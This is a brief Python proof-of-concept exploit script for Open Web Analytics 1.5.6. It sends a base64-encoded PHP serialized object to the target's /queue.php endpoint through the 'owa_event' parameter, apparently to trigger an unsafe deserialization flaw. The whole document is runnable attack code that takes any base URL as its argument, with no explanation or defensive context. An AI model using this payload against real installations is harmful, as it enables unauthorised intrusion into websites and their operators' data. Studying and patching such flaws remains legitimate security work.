# Open Web Analytics (1.5.6) - PoC
import requests
import sys
import base64

def printUsageAndExit():
    print("[#] Usage: python [BASEURL]")
    exit()

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 2):
    printUsageAndExit()

TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'

URL = "{}{}".format(sys.argv[1], "/queue.php")
PAYLOAD = {"owa_event": base64.b64encode(TRIGGER_INPUT.encode("ascii"))}
r = requests.post(URL, data = PAYLOAD)
# print(r.text)
